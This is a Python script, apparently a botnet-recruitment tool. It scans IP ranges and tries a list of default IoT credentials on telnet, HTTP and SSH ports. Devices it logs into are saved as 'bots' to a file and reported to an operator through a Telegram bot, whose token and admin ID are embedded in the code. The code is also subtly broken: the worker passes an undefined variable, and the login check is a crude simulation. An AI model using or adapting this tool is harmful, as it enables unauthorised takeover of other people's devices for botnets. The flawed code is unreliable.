import socket
import threading
from queue import Queue
import time
import ipaddress
import telegram
from telegram.ext import Updater, CommandHandler

# Default credentials for IoT devices
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("root", "root"),
    ("user", "password"),
    ("admin", "1234"),
    ("", ""),  # Empty credentials
    ("admin", "password"),
    ("pi", "raspberry"),
    ("ubnt", "ubnt"),
    ("guest", "guest"),
    ("support", "support"),
    ("operator", "operator"),
    ("service", "service"),
    ("customer", "customer"),
    ("install", "install"),
    ("password", "password"),
    ("1234", "1234"),
    ("1111", "1111"),
    ("0000", "0000")
]

# Telegram Bot configuration
TELEGRAM_TOKEN = "8277845947:AAEwwbrhQ6yiCBCRVCZs8lllspb5m2wrn6o"  # Replace with your bot token
ADMIN_ID = 5309199078  # Replace with your Telegram user ID

bot = telegram.Bot(token=TELEGRAM_TOKEN)

# Function to test login with default credentials
def test_login(ip, port, credentials):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ip, port))
        
        # Send username and password (simple telnet-like login simulation)
        for username, password in credentials:
            sock.sendall(f"{username}\n{password}\n".encode())
            response = sock.recv(1024).decode()
            if "success" in response.lower() or "welcome" in response.lower():
                return True
        sock.close()
    except Exception as e:
        pass
    return False

# Function to save bot to file
def save_bot(ip, port, credentials, bots_found):
    bots_found.append(f"{ip}:{port}:{credentials[0]}:{credentials[1]}")

# Function to scan IP address
def scan(ip, ports, credentials, bots_found):
    for port in ports:
        if test_login(ip, port, credentials):
            save_bot(ip, port, credentials, bots_found)

# Worker thread function
def worker(queue, ports, credentials, bots_found):
    while True:
        ip = queue.get()
        scan(ip, port, credentials, bots_found)
        queue.task_done()

# Create worker threads
def create_workers(queue, num_threads, ports, credentials, bots_found):
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(queue, ports, credentials, bots_found))
        thread.daemon = True
        thread.start()

# Enqueue IPs to scan
def enqueue_ips(queue, ip_range):
    for ip in ip_range:
        queue.put(str(ip))

# Run the scan
def run_scan(ip_network, num_threads, ports, max_bots):
    queue = Queue()
    bots_found = []
    ip_range = ipaddress.IPv4Network(ip_network)  # Auto generate IP range
    create_workers(queue, num_threads, ports, DEFAULT_CREDENTIALS, bots_found)
    enqueue_ips(queue, ip_range)
    
    # Start scanning
    print("[*] Starting scan...")
    start_time = time.time()
    
    # Wait until we find the desired number of bots or finish scanning
    while len(bots_found) < max_bots and not queue.empty():
        time.sleep(1)
    
    queue.join()
    elapsed_time = time.time() - start_time
    print(f"[*] Scan completed in {elapsed_time:.2f} seconds.")
    return bots_found

# Save bots to file
def save_bots_to_file(bots_found, file_path):
    with open(file_path, "w") as file:
        for bot in bots_found:
            file.write(f"{bot}\n")
    print(f"[+] {len(bots_found)} bots saved to {file_path}")

# Telegram Bot commands
def start(update, context):
    message = """
TOOL GET BOTS IOT DEVICES
SERVICE :
BOTS GET :
Wait SCAN
"""
    context.bot.send_message(chat_id=update.effective_chat.id, text=message)

def scan_command(update, context):
    global bots_found
    bots_found = []
    ip_network = "192.168.1.0/24"  # Example IP range
    num_threads = 200
    max_bots = 100
    ports = [23, 80, 443, 22]

    # Run the scan
    bots_found = run_scan(ip_network, num_threads, ports, max_bots)

    # Save bots to file
    save_bots_to_file(bots_found, "bots.txt")

    # Send results to Telegram
    total_bots = len(bots_found)
    message = f"Total Bots Found: {total_bots}\nBots saved to bots.txt"
    context.bot.send_message(chat_id=ADMIN_ID, text=message)

# Main function
if __name__ == "__main__":
    # Set up Telegram Bot
    updater = Updater(token=TELEGRAM_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    # Add command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("scan", scan_command))

    # Start the Bot
    updater.start_polling()
    updater.idle()